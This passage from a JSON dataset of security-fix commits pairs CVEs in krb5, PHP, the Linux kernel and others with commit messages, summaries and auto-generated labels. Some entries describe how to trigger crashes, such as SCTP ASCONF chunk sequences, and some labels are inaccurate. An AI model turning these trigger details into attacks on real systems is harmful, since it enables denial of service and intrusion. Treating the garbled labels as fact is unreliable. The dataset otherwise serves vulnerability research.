attacker"},{"commit_id":"dc7ed55c689d57de7f7408b34631bf06fec9dab1","cve_id":"CVE-2014-4345","cwe_id":"CWE-189","commit_message":"Fix LDAP key data segmentation [CVE-2014-4345]\n\nFor principal entries having keys with multiple kvnos (due to use of\n-keepold), the LDAP KDB module makes an attempt to store all the keys\nhaving the same kvno into a single krbPrincipalKey attribute value.\nThere is a fencepost error in the loop, causing currkvno to be set to\nthe just-processed value instead of the next kvno.  As a result, the\nsecond and all following groups of multiple keys by kvno are each\nstored in two krbPrincipalKey attribute values.  Fix the loop to use\nthe correct kvno value.\n\nCVE-2014-4345:\n\nIn MIT krb5, when kadmind is configured to use LDAP for the KDC\ndatabase, an authenticated remote attacker can cause it to perform an\nout-of-bounds write (buffer overrun) by performing multiple cpw\n-keepold operations.  An off-by-one error while copying key\ninformation to the new database entry results in keys sharing a common\nkvno being written to different array buckets, in an array whose size\nis determined by the number of kvnos present.  After sufficient\niterations, the extra writes extend past the end of the\n(NULL-terminated) array.  The NULL terminator is always written after\nthe end of the loop, so no out-of-bounds data is read, it is only\nwritten.\n\nHistorically, it has been possible to convert an out-of-bounds write\ninto remote code execution in some cases, though the necessary\nexploits must be tailored to the individual application and are\nusually quite complicated.  Depending on the allocated length of the\narray, an out-of-bounds write may also cause a segmentation fault\nand\/or application crash.\n\n    CVSSv2 Vector: AV:N\/AC:M\/Au:S\/C:C\/I:C\/A:C\/E:POC\/RL:OF\/RC:C\n\n[ghudson@mit.edu: clarified commit message]\n[kaduk@mit.edu: CVE summary, CVSSv2 vector]\n\n(cherry picked from commit 81c332e29f10887c6b9deb065f81ba259f4c7e03)\n\nticket: 7980\nversion_fixed: 1.12.2\nstatus: resolved","summary":"Off-by-one error in the krb5_encode_krbsecretkey function in plugins\/kdb\/ldap\/libkdb_ldap\/ldap_principal2.c in the LDAP KDB module in kadmind in MIT Kerberos 5 (aka krb5) 1.6.x through 1.11.x before 1.11.6 and 1.12.x before 1.12.2 allows remote authenticated users to cause a denial of service (buffer overflow) or possibly execute arbitrary code via a series of *cpw -keepold* commands.","commit_message_1":"fix ldap key data segmentation [ <cve_id> ] for principal entry having key with multiple kvnos ( due to use of -keepold ) , the ldap kdb module make an attempt to store all the key having the same kvno into a single krbprincipalkey attribute value","Vulnerability Type":"Numeric Errors","Attack Vector":"By sending an overly long array","Impact":"overflow a buffer and execute arbitrary code on the system","Root Cause":"caused by improper bounds checking by the krb5_encode_krbsecretkey() function","Attack Type":"remote attacker"},{"commit_id":"a7886f0ed1277c69142b14a2c6629175a6331edc","cve_id":"CVE-2014-4344","cwe_id":"CWE-476","commit_message":"Fix null deref in SPNEGO acceptor [CVE-2014-4344]\n\nWhen processing a continuation token, acc_ctx_cont was dereferencing\nthe initial byte of the token without checking the length.  This could\nresult in a null dereference.\n\nCVE-2014-4344:\n\nIn MIT krb5 1.5 and newer, an unauthenticated or partially\nauthenticated remote attacker can cause a NULL dereference and\napplication crash during a SPNEGO negotiation by sending an empty\ntoken as the second or later context token from initiator to acceptor.\nThe attacker must provide at least one valid context token in the\nsecurity context negotiation before sending the empty token.  This can\nbe done by an unauthenticated attacker by forcing SPNEGO to\nrenegotiate the underlying mechanism, or by using IAKERB to wrap an\nunauthenticated AS-REQ as the first token.\n\n    CVSSv2 Vector: AV:N\/AC:L\/Au:N\/C:N\/I:N\/A:C\/E:POC\/RL:OF\/RC:C\n\n[kaduk@mit.edu: CVE summary, CVSSv2 vector]\n\n(cherry picked from commit 524688ce87a15fc75f87efc8c039ba4c7d5c197b)\n\nticket: 7970\nversion_fixed: 1.12.2\nstatus: resolved","summary":"The acc_ctx_cont function in the SPNEGO acceptor in lib\/gssapi\/spnego\/spnego_mech.c in MIT Kerberos 5 (aka krb5) 1.5.x through 1.12.x before 1.12.2 allows remote attackers to cause a denial of service (NULL pointer dereference and application crash) via an empty continuation token at a certain point during a SPNEGO negotiation.","commit_message_1":"fix null deref in spnego acceptor [ <cve_id> ] when processing a continuation token , acc_ctx_cont wa dereferencing the initial byte of the token without checking the length","Vulnerability Type":"NULL Pointer Dereference","Attack Vector":"via an empty continuation token at a certain","Impact":"cause a denial of service ( pointer dereference and application crash )","Root Cause":"within the SPNEGO Acceptor for Continuation Tokens","Attack Type":"remote attacker"},{"commit_id":"f18ddf5d82de0ab7591a36e465bc24225776940f","cve_id":"CVE-2014-4343","cwe_id":"CWE-415","commit_message":"Fix double-free in SPNEGO [CVE-2014-4343]\n\nIn commit cd7d6b08 (\"Verify acceptor's mech in SPNEGO initiator\") the\npointer sc->internal_mech became an alias into sc->mech_set->elements,\nwhich should be considered constant for the duration of the SPNEGO\ncontext.  So don't free it.\n\nCVE-2014-4343:\n\nIn MIT krb5 releases 1.10 and newer, an unauthenticated remote\nattacker with the ability to spoof packets appearing to be from a\nGSSAPI acceptor can cause a double-free condition in GSSAPI initiators\n(clients) which are using the SPNEGO mechanism, by returning a\ndifferent underlying mechanism than was proposed by the initiator.  At\nthis stage of the negotiation, the acceptor is unauthenticated, and\nthe acceptor's response could be spoofed by an attacker with the\nability to inject traffic to the initiator.\n\nHistorically, some double-free vulnerabilities can be translated into\nremote code execution, though the necessary exploits must be tailored\nto the individual application and are usually quite\ncomplicated. Double-frees can also be exploited to cause an\napplication crash, for a denial of service.  However, most GSSAPI\nclient applications are not vulnerable, as the SPNEGO mechanism is not\nused by default (when GSS_C_NO_OID is passed as the mech_type argument\nto gss_init_sec_context()).  The most common use of SPNEGO is for\nHTTP-Negotiate, used in web browsers and other web clients.  Most such\nclients are believed to not offer HTTP-Negotiate by default, instead\nrequiring a whitelist of sites for which it may be used to be\nconfigured.  If the whitelist is configured to only allow\nHTTP-Negotiate over TLS connections (\"https:\/\/\"), a successful\nattacker must also spoof the web server's SSL certificate, due to the\nway the WWW-Authenticate header is sent in a 401 (Unauthorized)\nresponse message.  Unfortunately, many instructions for enabling\nHTTP-Negotiate in common web browsers do not include a TLS\nrequirement.\n\n    CVSSv2 Vector: AV:N\/AC:H\/Au:N\/C:C\/I:C\/A:C\/E:POC\/RL:OF\/RC:C\n\n[kaduk@mit.edu: CVE summary and CVSSv2 vector]\n\nticket: 7969 (new)\ntarget_version: 1.12.2\ntags: pullup","summary":"Double free vulnerability in the init_ctx_reselect function in the SPNEGO initiator in lib\/gssapi\/spnego\/spnego_mech.c in MIT Kerberos 5 (aka krb5) 1.10.x through 1.12.x before 1.12.2 allows remote attackers to cause a denial of service (memory corruption) or possibly execute arbitrary code via network traffic that appears to come from an intended acceptor, but specifies a security mechanism different from the one proposed by the initiator.","commit_message_1":"fix double-free in spnego [ <cve_id> ] in commit cd7d6b08 ( `` verify acceptor 's mech in spnego initiator '' ) the pointer sc- > internal_mech became an alias into sc- > mech_set- > element , which should be considered constant for the duration of the spnego context","Vulnerability Type":"double free","Attack Vector":"By sending a specially-crafted request","Impact":"cause a denial of service or possibly execute arbitrary code","Root Cause":"caused by a double-free error","Attack Type":"remote attacker"},{"commit_id":"e6ae703ae597d798e310368d52b8f38ee11c6a73","cve_id":"CVE-2014-4342","cwe_id":"CWE-119","commit_message":"Handle invalid RFC 1964 tokens [CVE-2014-4341...]\n\nDetect the following cases which would otherwise cause invalid memory\naccesses and\/or integer underflow:\n\n* An RFC 1964 token being processed by an RFC 4121-only context\n  [CVE-2014-4342]\n\n* A header with fewer than 22 bytes after the token ID or an\n  incomplete checksum [CVE-2014-4341 CVE-2014-4342]\n\n* A ciphertext shorter than the confounder [CVE-2014-4341]\n\n* A declared padding length longer than the plaintext [CVE-2014-4341]\n\nIf we detect a bad pad byte, continue on to compute the checksum to\navoid creating a padding oracle, but treat the checksum as invalid\neven if it compares equal.\n\nCVE-2014-4341:\n\nIn MIT krb5, an unauthenticated remote attacker with the ability to\ninject packets into a legitimately established GSSAPI application\nsession can cause a program crash due to invalid memory references\nwhen attempting to read beyond the end of a buffer.\n\n    CVSSv2 Vector: AV:N\/AC:M\/Au:N\/C:N\/I:N\/A:P\/E:POC\/RL:OF\/RC:C\n\nCVE-2014-4342:\n\nIn MIT krb5 releases krb5-1.7 and later, an unauthenticated remote\nattacker with the ability to inject packets into a legitimately\nestablished GSSAPI application session can cause a program crash due\nto invalid memory references when reading beyond the end of a buffer\nor by causing a null pointer dereference.\n\n    CVSSv2 Vector: AV:N\/AC:M\/Au:N\/C:N\/I:N\/A:P\/E:POC\/RL:OF\/RC:C\n\n[tlyu@mit.edu: CVE summaries, CVSS]\n\n(cherry picked from commit fb99962cbd063ac04c9a9d2cc7c75eab73f3533d)\n\nticket: 7949\nversion_fixed: 1.12.2\nstatus: resolved","summary":"MIT Kerberos 5 (aka krb5) 1.7.x through 1.12.x before 1.12.2 allows remote attackers to cause a denial of service (buffer over-read or NULL pointer dereference, and application crash) by injecting invalid tokens into a GSSAPI application session.","commit_message_1":"handle invalid rfc <number> token [ <cve_id>","Vulnerability Type":"buffer overflow","Attack Vector":"by injecting invalid tokens into a gssapi application session","Impact":"cause a denial of service ( buffer over - read or pointer dereference , and application crash )","Root Cause":"caused by a NULL pointer dereference","Attack Type":"remote attacker"},{"commit_id":"b34d7849ed90ced9345f8ea1c59bc8d101c18468","cve_id":"CVE-2014-4049","cwe_id":"CWE-119","commit_message":"Merge branch 'PHP-5.6'\n\n* PHP-5.6:\n  Fix potential segfault in dns_get_record()","summary":"Heap-based buffer overflow in the php_parserr function in ext\/standard\/dns.c in PHP 5.6.0beta4 and earlier allows remote servers to cause a denial of service (crash) and possibly execute arbitrary code via a crafted DNS TXT record, related to the dns_get_record function.","commit_message_1":"fix potential segfault in dns_get_record ( )","Vulnerability Type":"buffer overflow","Attack Vector":"via a crafted dns txt record , related to the dns _ get _ record function","Impact":"cause a denial of service ( crash ) and possibly execute arbitrary code","Root Cause":"caused by improper bounds checking when parsing DNS TXT record","Attack Type":"remote attacker"},{"commit_id":"4442dc8a92b8f9ad8ee9e7f8438f4c04c03a22dc","cve_id":"CVE-2014-4027","cwe_id":"CWE-264","commit_message":"target\/rd: Refactor rd_build_device_space + rd_release_device_space\n\nThis patch refactors rd_build_device_space() + rd_release_device_space()\ninto rd_allocate_sgl_table() + rd_release_device_space() so that they\nmay be used seperatly for setup + release of protection information\nscatterlists.\n\nAlso add explicit memset of pages within rd_allocate_sgl_table() based\nupon passed 'init_payload' value.\n\nv2 changes:\n  - Drop unused sg_table from rd_release_device_space (Wei)\n\nCc: Martin K. Petersen <martin.petersen@oracle.com>\nCc: Christoph Hellwig <hch@lst.de>\nCc: Hannes Reinecke <hare@suse.de>\nCc: Sagi Grimberg <sagig@mellanox.com>\nCc: Or Gerlitz <ogerlitz@mellanox.com>\nSigned-off-by: Nicholas Bellinger <nab@linux-iscsi.org>","summary":"The rd_build_device_space function in drivers\/target\/target_core_rd.c in the Linux kernel before 3.14 does not properly initialize a certain data structure, which allows local users to obtain sensitive information from ramdisk_mcp memory by leveraging access to a SCSI initiator.","commit_message_1":"refactor rd_build_device_space + rd_release_device_space this patch refactors rd_build_device_space ( ) + rd_release_device_space ( ) into rd_allocate_sgl_table ( ) + rd_release_device_space ( ) so that they may be used seperatly for setup + release of protection information scatterlists","Vulnerability Type":"Permissions, Privileges, and Access Controls","Attack Vector":"by leveraging access to a scsi initiator","Impact":"obtain sensitive information from ramdisk _ mcp memory","Root Cause":"does not properly initialize a certain data structure","Attack Type":"local attacker"},{"commit_id":"23adbe12ef7d3d4195e80800ab36b37bee28cd03","cve_id":"CVE-2014-4014","cwe_id":"CWE-264","commit_message":"fs,userns: Change inode_capable to capable_wrt_inode_uidgid\n\nThe kernel has no concept of capabilities with respect to inodes; inodes\nexist independently of namespaces.  For example, inode_capable(inode,\nCAP_LINUX_IMMUTABLE) would be nonsense.\n\nThis patch changes inode_capable to check for uid and gid mappings and\nrenames it to capable_wrt_inode_uidgid, which should make it more\nobvious what it does.\n\nFixes CVE-2014-4014.\n\nCc: Theodore Ts'o <tytso@mit.edu>\nCc: Serge Hallyn <serge.hallyn@ubuntu.com>\nCc: \"Eric W. Biederman\" <ebiederm@xmission.com>\nCc: Dave Chinner <david@fromorbit.com>\nCc: stable@vger.kernel.org\nSigned-off-by: Andy Lutomirski <luto@amacapital.net>\nSigned-off-by: Linus Torvalds <torvalds@linux-foundation.org>","summary":"The capabilities implementation in the Linux kernel before 3.14.8 does not properly consider that namespaces are inapplicable to inodes, which allows local users to bypass intended chmod restrictions by first creating a user namespace, as demonstrated by setting the setgid bit on a file with group ownership of root.","commit_message_1":"change inode_capable to capable_wrt_inode_uidgid the kernel ha no concept of capability with respect to inodes ; inodes exist independently of namespaces","Vulnerability Type":"Permissions, Privileges, and Access Controls","Attack Vector":"by setting the setgid bit on a file with group ownership of root ","Impact":"bypass intended chmod restrictions by first creating a user namespace ","Root Cause":"does not properly consider that namespaces are inapplicable to inodes","Attack Type":"local attacker"},{"commit_id":"3a87aa2f10bd7f1408e1849bdb59c41dd63a9fe9","cve_id":"CVE-2014-3985","cwe_id":"CWE-119","commit_message":"miniwget.c: fixed potential buffer overrun","summary":"The getHTTPResponse function in miniwget.c in MiniUPnP 1.9 allows remote attackers to cause a denial of service (crash) via crafted headers that trigger an out-of-bounds read.","commit_message_1":"<file> : fixed potential buffer overrun","Vulnerability Type":"buffer overflow","Attack Vector":"via crafted headers that trigger an out - of - bounds read","Impact":"cause a denial of service ( crash )","Root Cause":"caused by improper bounds checking by miniwget.c","Attack Type":"remote attacker"},{"commit_id":"293d9d3f","cve_id":"CVE-2014-3980","cwe_id":"CWE-264","commit_message":"Don't use abstract Unix domain sockets","summary":"libfep 0.0.5 before 0.1.0 does not properly use UNIX domain sockets in the abstract namespace, which allows local users to gain privileges via unspecified vectors.","commit_message_1":"do n't use abstract unix domain socket","Vulnerability Type":"Permissions, Privileges, and Access Controls","Attack Vector":"via unspecified vectors","Impact":"gain privileges","Root Cause":"does not properly use unix domain sockets","Attack Type":"local attacker"},{"commit_id":"c151e0660b9736fe66b224f1129a16871165251b","cve_id":"CVE-2014-3971","cwe_id":"CWE-20","commit_message":"SERVER-13573 Fix x.509 auth exception","summary":"The CmdAuthenticate::_authenticateX509 function in db\/commands\/authentication_commands.cpp in mongod in MongoDB 2.6.x before 2.6.2 allows remote attackers to cause a denial of service (daemon crash) by attempting authentication with an invalid X.509 client certificate.","commit_message_1":"server-<number> fix <file> auth exception","Vulnerability Type":"Improper Input Validation","Attack Vector":"by attempting authentication with an invalid x . 509 client certificate","Impact":"cause a denial of service ( daemon crash )","Root Cause":"caused by an error","Attack Type":"remote attacker"},{"commit_id":"39c7ac1106be844a5296d3eb5971946cc09ffda0","cve_id":"CVE-2014-3710","cwe_id":"CWE-20","commit_message":"Fix note bounds reading, Francisco Alonso \/ Red Hat","summary":"The donote function in readelf.c in file through 5.20, as used in the Fileinfo component in PHP 5.4.34, does not ensure that sufficient note headers are present, which allows remote attackers to cause a denial of service (out-of-bounds read and application crash) via a crafted ELF file.","commit_message_1":"fix note bound reading , francisco alonso \/ red hat","Vulnerability Type":"Improper Input Validation","Attack Vector":"via a crafted elf file","Impact":"cause a denial of service ( out - of - bounds read and application crash )","Root Cause":"does not ensure that sufficient note headers are present","Attack Type":"remote attacker"},{"commit_id":"d974baa398f34393db76be45f7d4d04fbdbb4a0a","cve_id":"CVE-2014-3690","cwe_id":"CWE-399","commit_message":"x86,kvm,vmx: Preserve CR4 across VM entry\n\nCR4 isn't constant; at least the TSD and PCE bits can vary.\n\nTBH, treating CR0 and CR3 as constant scares me a bit, too, but it looks\nlike it's correct.\n\nThis adds a branch and a read from cr4 to each vm entry.  Because it is\nextremely likely that consecutive entries into the same vcpu will have\nthe same host cr4 value, this fixes up the vmcs instead of restoring cr4\nafter the fact.  A subsequent patch will add a kernel-wide cr4 shadow,\nreducing the overhead in the common case to just two memory reads and a\nbranch.\n\nSigned-off-by: Andy Lutomirski <luto@amacapital.net>\nAcked-by: Paolo Bonzini <pbonzini@redhat.com>\nCc: stable@vger.kernel.org\nCc: Petr Matousek <pmatouse@redhat.com>\nCc: Gleb Natapov <gleb@kernel.org>\nSigned-off-by: Linus Torvalds <torvalds@linux-foundation.org>","summary":"arch\/x86\/kvm\/vmx.c in the KVM subsystem in the Linux kernel before 3.17.2 on Intel processors does not ensure that the value in the CR4 control register remains the same after a VM entry, which allows host OS users to kill arbitrary processes or cause a denial of service (system disruption) by leveraging \/dev\/kvm access, as demonstrated by PR_SET_TSC prctl calls within a modified copy of QEMU.","commit_message_1":"preserve cr4 across vm entry cr4 is n't constant ; at least the tsd and pce bit can vary","Vulnerability Type":"Resource Management Errors","Attack Vector":"by leveraging \/ dev \/ kvm access , as demonstrated by pr _ set _ tsc prctl calls within a modified copy of qemu","Impact":"kill arbitrary processes or cause a denial of service ( system disruption )","Root Cause":"does not ensure that the value","Attack Type":"local attacker"},{"commit_id":"26b87c7881006311828bb0ab271a551a62dcceb4","cve_id":"CVE-2014-3688","cwe_id":"CWE-399","commit_message":"net: sctp: fix remote memory pressure from excessive queueing\n\nThis scenario is not limited to ASCONF, just taken as one\nexample triggering the issue. When receiving ASCONF probes\nin the form of ...\n\n  -------------- INIT[ASCONF; ASCONF_ACK] ------------->\n  <----------- INIT-ACK[ASCONF; ASCONF_ACK] ------------\n  -------------------- COOKIE-ECHO -------------------->\n  <-------------------- COOKIE-ACK ---------------------\n  ---- ASCONF_a; [ASCONF_b; ...; ASCONF_n;] JUNK ------>\n  [...]\n  ---- ASCONF_m; [ASCONF_o; ...; ASCONF_z;] JUNK ------>\n\n... where ASCONF_a, ASCONF_b, ..., ASCONF_z are good-formed\nASCONFs and have increasing serial numbers, we process such\nASCONF chunk(s) marked with !end_of_packet and !singleton,\nsince we have not yet reached the SCTP packet end. SCTP does\nonly do verification on a chunk by chunk basis, as an SCTP\npacket is nothing more than just a container of a stream of\nchunks which it eats up one by one.\n\nWe could run into the case that we receive a packet with a\nmalformed tail, above marked as trailing JUNK. All previous\nchunks are here goodformed, so the stack will eat up all\nprevious chunks up to this point. In case JUNK does not fit\ninto a chunk header and there are no more other chunks in\nthe input queue, or in case JUNK contains a garbage chunk\nheader, but the encoded chunk length would exceed the skb\ntail, or we came here from an entirely different scenario\nand the chunk has pdiscard=1 mark (without having had a flush\npoint), it will happen, that we will excessively queue up\nthe association's output queue (a correct final chunk may\nthen turn it into a response flood when flushing the\nqueue ;)): I ran a simple script with incremental ASCONF\nserial numbers and could see the server side consuming\nexcessive amount of RAM [before\/after: up to 2GB and more].\n\nThe issue at heart is that the chunk train basically ends\nwith !end_of_packet and !singleton markers and since commit\n2e3216cd54b1 (\"sctp: Follow security requirement of responding\nwith 1 packet\") therefore preventing an output queue flush\npoint in sctp_do_sm() -> sctp_cmd_interpreter() on the input\nchunk (chunk = event_arg) even though local_cork is set,\nbut its precedence has changed since then. In the normal\ncase, the last chunk with end_of_packet=1 would trigger the\nqueue flush to accommodate possible outgoing bundling.\n\nIn the input queue, sctp_inq_pop() seems to do the right thing\nin terms of discarding invalid chunks. So, above JUNK will\nnot enter the state machine and instead be released and exit\nthe sctp_assoc_bh_rcv() chunk processing loop. It's simply\nthe flush point being missing at loop exit. Adding a try-flush\napproach on the output queue might not work as the underlying\ninfrastructure might be long gone at this point due to the\nside-effect interpreter run.\n\nOne possibility, albeit a bit of a kludge, would be to defer\ninvalid chunk freeing into the state machine in order to\npossibly trigger packet discards and thus indirectly a queue\nflush on error. It would surely be better to discard chunks\nas in the current, perhaps better controlled environment, but\ngoing back and forth, it's simply architecturally not possible.\nI tried various trailing JUNK attack cases and it seems to\nlook good now.\n\nJoint work with Vlad Yasevich.\n\nFixes: 2e3216cd54b1 (\"sctp: Follow security requirement of responding with 1 packet\")\nSigned-off-by: Daniel Borkmann <dborkman@redhat.com>\nSigned-off-by: Vlad Yasevich <vyasevich@gmail.com>\nSigned-off-by: David S. Miller <davem@davemloft.net>","summary":"The SCTP implementation in the Linux kernel before 3.17.4 allows remote attackers to cause a denial of service (memory consumption) by triggering a large number of chunks in an association's output queue, as demonstrated by ASCONF probes, related to net\/sctp\/inqueue.c and net\/sctp\/sm_statefuns.c.","commit_message_1":"sctp : fix remote memory pressure from excessive queueing this scenario is not limited to asconf , just taken a one example triggering the issue","Vulnerability Type":"Resource Management Errors","Attack Vector":"by triggering a large number of chunks in an association ' s output queue , as demonstrated by asconf probes , related to net \/ sctp \/ inqueue . c and net \/ sctp \/ sm _ statefuns . c","Impact":"cause a denial of service ( memory consumption )","Root Cause":"caused by the improper handling of the association's output queue by the SCTP implementation","Attack Type":"remote attacker"},{"commit_id":"b69040d8e39f20d5215a03502a8e8b4c6ab78395","cve_id":"CVE-2014-3687","cwe_id":"CWE-399","commit_message":"net: sctp: fix panic on duplicate ASCONF chunks\n\nWhen receiving a e.g. semi-good formed connection scan in the\nform of ...\n\n  -------------- INIT[ASCONF; ASCONF_ACK] ------------->\n  <----------- INIT-ACK[ASCONF; ASCONF_ACK] ------------\n  -------------------- COOKIE-ECHO -------------------->\n  <-------------------- COOKIE-ACK ---------------------\n  ---------------- ASCONF_a; ASCONF_b ----------------->\n\n... where ASCONF_a equals ASCONF_b chunk (at least both serials\nneed to be equal), we panic an SCTP server!\n\nThe problem is that good-formed ASCONF chunks that we reply with\nASCONF_ACK chunks are cached per serial. Thus, when we receive a\nsame ASCONF chunk twice (e.g. through a lost ASCONF_ACK), we do\nnot need to process them again on the server side (that was the\nidea, also proposed in the RFC). Instead, we know it was cached\nand we just resend the cached chunk instead. So far, so good.\n\nWhere things get nasty is in SCTP's side effect interpreter, that\nis, sctp_cmd_interpreter():\n\nWhile incoming ASCONF_a (chunk = event_arg) is being marked\n!end_of_packet and !singleton, and we have an association context,\nwe do not flush the outqueue the first time after processing the\nASCONF_ACK singleton chunk via SCTP_CMD_REPLY. Instead, we keep it\nqueued up, although we set local_cork to 1. Commit 2e3216cd54b1\nchanged the precedence, so that as long as we get bundled, incoming\nchunks we try possible bundling on outgoing queue as well. Before\nthis commit, we would just flush the output queue.\n\nNow, while ASCONF_a's ASCONF_ACK sits in the corked outq, we\ncontinue to process the same ASCONF_b chunk from the packet. As\nwe have cached the previous ASCONF_ACK, we find it, grab it and\ndo another SCTP_CMD_REPLY command on it. So, effectively, we rip\nthe chunk->list pointers and requeue the same ASCONF_ACK chunk\nanother time. Since we process ASCONF_b, it's correctly marked\nwith end_of_packet and we enforce an uncork, and thus flush, thus\ncrashing the kernel.\n\nFix it by testing if the ASCONF_ACK is currently pending and if\nthat is the case, do not requeue it. When flushing the output\nqueue we may relink the chunk for preparing an outgoing packet,\nbut eventually unlink it when it's copied into the skb right\nbefore transmission.\n\nJoint work with Vlad Yasevich.\n\nFixes: 2e3216cd54b1 (\"sctp: Follow security requirement of responding with 1 packet\")\nSigned-off-by: Daniel Borkmann <dborkman@redhat.com>\nSigned-off-by: Vlad Yasevich <vyasevich@gmail.com>\nSigned-off-by: David S. Miller <davem@davemloft.net>","summary":"The sctp_assoc_lookup_asconf_ack function in net\/sctp\/associola.c in the SCTP implementation in the Linux kernel through 3.17.2 allows remote attackers to cause a denial of service (panic) via duplicate ASCONF chunks that trigger an incorrect uncork within the side-effect interpreter.","commit_message_1":"sctp : fix panic on duplicate asconf chunk when receiving a <file>","Vulnerability Type":"Resource Management Errors","Attack Vector":"via duplicate asconf chunks that trigger an incorrect uncork within the side - effect interpreter","Impact":"cause a denial of service ( panic )","Root Cause":"caused by an error when sctp stack receives duplicate ASCONF chunks","Attack Type":"remote attacker"},{"commit_id":"9de7922bc709eee2f609cd01d98aaedc4cf5ea74","cve_id":"CVE-2014-3673","cwe_id":"CWE-399","commit_message":"net: sctp: fix skb_over_panic when receiving malformed ASCONF chunks\n\nCommit 6f4c618ddb0 (\"SCTP : Add paramters validity check for\nASCONF chunk\") added basic verification of ASCONF chunks, however,\nit is still possible to remotely crash a server by sending a\nspecial crafted ASCONF chunk, even up to pre 2.6.12 kernels:\n\nskb_over_panic: text:ffffffffa01ea1c3 len:31056 put:30768\n head:ffff88011bd81800 data:ffff88011bd81800 tail:0x7950\n end:0x440 dev:<NULL>\n ------------[ cut here ]------------\nkernel BUG at net\/core\/skbuff.c:129!\n[...]\nCall Trace:\n <IRQ>\n [<ffffffff8144fb1c>] skb_put+0x5c\/0x70\n [<ffffffffa01ea1c3>] sctp_addto_chunk+0x63\/0xd0 [sctp]\n [<ffffffffa01eadaf>] sctp_process_asconf+0x1af\/0x540 [sctp]\n [<ffffffff8152d025>] ? _read_unlock_bh+0x15\/0x20\n [<ffffffffa01e0038>] sctp_sf_do_asconf+0x168\/0x240 [sctp]\n [<ffffffffa01e3751>] sctp_do_sm+0x71\/0x1210 [sctp]\n [<ffffffff8147645d>] ? fib_rules_lookup+0xad\/0xf0\n [<ffffffffa01e6b22>] ? sctp_cmp_addr_exact+0x32\/0x40 [sctp]\n [<ffffffffa01e8393>] sctp_assoc_bh_rcv+0xd3\/0x180 [sctp]\n [<ffffffffa01ee986>] sctp_inq_push+0x56\/0x80 [sctp]\n [<ffffffffa01fcc42>] sctp_rcv+0x982\/0xa10 [sctp]\n [<ffffffffa01d5123>] ? ipt_local_in_hook+0x23\/0x28 [iptable_filter]\n [<ffffffff8148bdc9>] ? nf_iterate+0x69\/0xb0\n [<ffffffff81496d10>] ? ip_local_deliver_finish+0x0\/0x2d0\n [<ffffffff8148bf86>] ? nf_hook_slow+0x76\/0x120\n [<ffffffff81496d10>] ? ip_local_deliver_finish+0x0\/0x2d0\n [<ffffffff81496ded>] ip_local_deliver_finish+0xdd\/0x2d0\n [<ffffffff81497078>] ip_local_deliver+0x98\/0xa0\n [<ffffffff8149653d>] ip_rcv_finish+0x12d\/0x440\n [<ffffffff81496ac5>] ip_rcv+0x275\/0x350\n [<ffffffff8145c88b>] __netif_receive_skb+0x4ab\/0x750\n [<ffffffff81460588>] netif_receive_skb+0x58\/0x60\n\nThis can be triggered e.g., through a simple scripted nmap\nconnection scan injecting the chunk after the handshake, for\nexample, ...\n\n  -------------- INIT[ASCONF; ASCONF_ACK] ------------->\n  <----------- INIT-ACK[ASCONF; ASCONF_ACK] ------------\n  -------------------- COOKIE-ECHO -------------------->\n  <-------------------- COOKIE-ACK ---------------------\n  ------------------ ASCONF; UNKNOWN ------------------>\n\n... where ASCONF chunk of length 280 contains 2 parameters ...\n\n  1) Add IP address parameter (param length: 16)\n  2) Add\/del IP address parameter (param length: 255)\n\n... followed by an UNKNOWN chunk of e.g. 4 bytes. Here, the\nAddress Parameter in the ASCONF chunk is even missing, too.\nThis is just an example and similarly-crafted ASCONF chunks\ncould be used just as well.\n\nThe ASCONF chunk passes through sctp_verify_asconf() as all\nparameters passed sanity checks, and after walking, we ended\nup successfully at the chunk end boundary, and thus may invoke\nsctp_process_asconf(). Parameter walking is done with\nWORD_ROUND() to take padding into account.\n\nIn sctp_process_asconf()'s TLV processing, we may fail in\nsctp_process_asconf_param() e.g., due to removal of the IP\naddress that is also the source address of the packet containing\nthe ASCONF chunk, and thus we need to add all TLVs after the\nfailure to our ASCONF response to remote via helper function\nsctp_add_asconf_response(), which basically invokes a\nsctp_addto_chunk() adding the error parameters to the given\nskb.\n\nWhen walking to the next parameter this time, we proceed\nwith ...\n\n  length = ntohs(asconf_param->param_hdr.length);\n  asconf_param = (void *)asconf_param + length;\n\n... instead of the WORD_ROUND()'ed length, thus resulting here\nin an off-by-one that leads to reading the follow-up garbage\nparameter length of 12336, and thus throwing an skb_over_panic\nfor the reply when trying to sctp_addto_chunk() next time,\nwhich implicitly calls the skb_put() with that length.\n\nFix it by using sctp_walk_params() [ which is also used in\nINIT parameter processing ] macro in the verification *and*\nin ASCONF processing: it will make sure we don't spill over,\nthat we walk parameters WORD_ROUND()'ed. Moreover, we're being\nmore defensive and guard against unknown parameter types and\nmissized addresses.\n\nJoint work with Vlad Yasevich.\n\nFixes: b896b82be4ae (\"[SCTP] ADDIP: Support for processing incoming ASCONF_ACK chunks.\")\nSigned-off-by: Daniel Borkmann <dborkman@redhat.com>\nSigned-off-by: Vlad Yasevich <vyasevich@gmail.com>\nAcked-by: Neil Horman <nhorman@tuxdriver.com>\nSigned-off-by: David S. Miller <davem@davemloft.net>","summary":"The SCTP implementation in the Linux kernel through 3.17.2 allows remote attackers to cause a denial of service (system crash) via a malformed ASCONF chunk, related to net\/sctp\/sm_make_chunk.c and net\/sctp\/sm_statefuns.c.","commit_message_1":"sctp : fix skb_over_panic when receiving malformed asconf chunk commit 6f4c618ddb0 ( `` sctp : add paramters validity check for asconf chunk '' ) added basic verification of asconf chunk , however , it is still possible to remotely crash a server by sending a special crafted asconf chunk , even up to pre <file>","Vulnerability Type":"Resource Management Errors","Attack Vector":"via a malformed asconf chunk , related to net \/ sctp \/ sm _ make _ chunk . c and net \/ sctp \/ sm _ statefuns . c","Impact":"cause a denial of service ( system crash )","Root Cause":"By sending specially-crafted ASCONF chunks to SCTP","Attack Type":"remote attacker"},{"commit_id":"d1442d85cc30ea75f7d399474ca738e0bc96f715","cve_id":"CVE-2014-3647","cwe_id":"CWE-264","commit_message":"KVM: x86: Handle errors when RIP is set during far jumps\n\nFar jmp\/call\/ret may fault while loading a new RIP.  Currently KVM does not\nhandle this case, and may result in failed vm-entry once the assignment is\ndone.  The tricky part of doing so is that loading the new CS affects the\nVMCS\/VMCB state, so if we fail during loading the new RIP, we are left in\nunconsistent state.  Therefore, this patch saves on 64-bit the old CS\ndescriptor and restores it if loading RIP failed.\n\nThis fixes CVE-2014-3647.\n\nCc: stable@vger.kernel.org\nSigned-off-by: Nadav Amit <namit@cs.technion.ac.il>\nSigned-off-by: Paolo Bonzini <pbonzini@redhat.com>","summary":"arch\/x86\/kvm\/emulate.c in the KVM subsystem in the Linux kernel through 3.17.2 does not properly perform RIP changes, which allows guest OS users to cause a denial of service (guest 